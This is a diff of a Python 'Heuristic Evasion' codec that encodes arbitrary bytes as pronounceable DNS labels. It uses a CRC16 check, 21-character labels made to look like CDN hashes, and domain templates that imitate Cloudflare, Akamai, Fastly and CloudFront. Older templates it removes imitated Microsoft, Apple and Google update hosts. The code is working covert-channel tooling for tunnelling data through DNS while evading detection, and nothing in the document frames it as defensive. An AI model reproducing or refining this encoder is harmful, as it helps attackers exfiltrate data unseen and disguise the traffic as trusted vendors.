@@ -1,15 +1,13 @@
-"""
-CVC Codec v2.0 - Advanced Heuristic Evasion
+"""CVC Codec v2.1 - Compact Heuristic Evasion
 ============================================
 Features:
-- CRC16 checksum for payload validation (trial-and-error decoding)
-- NO static delimiters (xx removed completely)
-- Variable payload position in templates
-- Junk label padding for variable packet length
-- Realistic DNS template patterns
+- CRC16 checksum for payload validation
+- NO static delimiters
+- 7 syllables per label (21 chars = CDN-hash look)
+- Max 4-6 total labels per domain
+- Realistic DNS template patterns (no junk)
 """
 import random
-import string
 import struct
 
 # --- CVC Constants ---
@@ -17,63 +15,32 @@ C_START = ['b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'r', 's',
 VOWELS = ['a', 'e', 'i', 'o', 'u', 'y']
 C_END = ['b', 'c', 'd', 'f', 'g', 'k', 'l', 'm', 'n', 'p', 'r', 's', 't', 'x', 'z']
 
-# --- Realistic DNS Templates (NO DELIMITERS) ---
-# {P} = Payload position, {J} = Junk label
-# Templates mimic real CDN/API/Cloud patterns
+# Syllables per DNS label (7 syllables = 21 chars, looks like CDN hash/token)
+SYLLABLES_PER_LABEL = 7
+
+# --- Realistic DNS Templates ---
+# {P} = payload labels (2-3 labels of 21 chars each)
+# Templates kept to 2-3 non-payload labels -> 4-6 total
 TEMPLATES = [
-    # CDN-style
-    "{P}.cdn.cloudflare.org",
-    "{P}.{J}.akamaihd.org",
-    "assets.{P}.cloudfront.org",
-    "static.{P}.{J}.fastly.org",
-    # API-style 
-    "api.{P}.{J}.aws.org",
-    "{J}.api.{P}.azure.org",
-    "v1.{P}.api.gcp.io",
-    "{P}.services.{J}.cloud",
-    # Analytics-style
-    "track.{P}.{J}.analytics.io",
-    "{J}.pixel.{P}.metrics.org",
-    "events.{P}.telemetry.org",
-    # Update/Download-style
-    "update.{P}.{J}.microsoft.org",
-    "{P}.download.{J}.apple.org",
-    "dl.{J}.{P}.google.org",
-    # Generic subdomains
-    "{P}.{J}.internal.corp",
-    "ns1.{P}.{J}.hosting.org",
-    "{J}.mail.{P}.servers.io",
+    # CDN-style (payload + 2 suffix = 4-5 total)
+    "{P}.cloudflare.org",
+    "{P}.akamaihd.org",
+    "{P}.cloudfront.org",
+    "{P}.fastly.org",
+    # Prefix + payload + suffix (1+payload+1 = 4-5 total)
+    "static.{P}.org",
+    "cdn.{P}.org",
+    "dl.{P}.org",
+    "img.{P}.org",
+    "api.{P}.io",
+    "data.{P}.io",
+    "v1.{P}.io",
+    "ns.{P}.io",
 ]
 
-# TLDs and common suffixes that happen to be valid CVC patterns - MUST SKIP!
-# com = c-o-m, net = n-e-t, biz = b-i-z are all valid CVCs but NOT payload!
+# Labels that are valid CVC but NOT payload (template parts / TLDs)
 TLD_BLACKLIST = {'com', 'net', 'biz', 'gov', 'mil', 'pub', 'top', 'win', 'xyz',
-                  'cdn', 'api', 'web', 'dev', 'app'}
-
-# Characters allowed in junk labels (looks like realistic subdomain parts)
-JUNK_CHARS = string.ascii_lowercase + string.digits
-
-def _generate_junk_label() -> str:
-    """
-    Generate a random junk label for variable packet length.
-    CRITICAL: Must ALWAYS contain digits to prevent accidental valid CVC patterns.
-    If junk happens to be all letters forming valid CVC, it corrupts decoding!
-    """
-    # Generate base length (will add mandatory digits)
-    base_len = random.randint(2, 8)
-    
-    # Generate random letters
-    letters = ''.join(random.choices(string.ascii_lowercase, k=base_len))
-    
-    # ALWAYS insert 2-3 random digits at random positions to break CVC patterns
-    num_digits = random.randint(2, 3)
-    digits = ''.join(random.choices(string.digits, k=num_digits))
-    
-    # Combine and shuffle
-    combined = list(letters + digits)
-    random.shuffle(combined)
-    
-    return ''.join(combined)
+                 'cdn', 'api', 'web', 'dev', 'app'}
 
 def _crc16(data: bytes) -> int:
     """CRC-16/CCITT-FALSE - Used to validate decoded payloads"""
@@ -147,12 +114,12 @@ def _bytes_to_cvc_labels(data: bytes) -> list:
     
     cvc_list.reverse()
     
-    # Group into labels (3 syllables per label = 9 chars)
+    # Group into labels (7 syllables per label = 21 chars, CDN-hash look)
     labels = []
     current_group = ""
     for i, cvc in enumerate(cvc_list):
         current_group += cvc
-        if (i + 1) % 3 == 0:
+        if (i + 1) % SYLLABLES_PER_LABEL == 0:
             labels.append(current_group)
             current_group = ""
     if current_group:
@@ -276,17 +243,9 @@ def encode_bytes_to_domain(raw_data: bytes) -> str:
     # Join CVC labels with dots to form payload subdomain
     payload_str = ".".join(cvc_labels)
     
-    # Generate junk label for variable packet length
-    junk = _generate_junk_label()
-    
-    # Pick random template and fill in payload/junk
+    # Pick random template and fill in payload
     template = random.choice(TEMPLATES)
-    
-    try:
-        domain = template.replace("{P}", payload_str).replace("{J}", junk)
-    except Exception:
-        # Fallback if template is malformed
-        domain = f"{payload_str}.{junk}.example.com"
+    domain = template.replace("{P}", payload_str)
     
     return domain
 
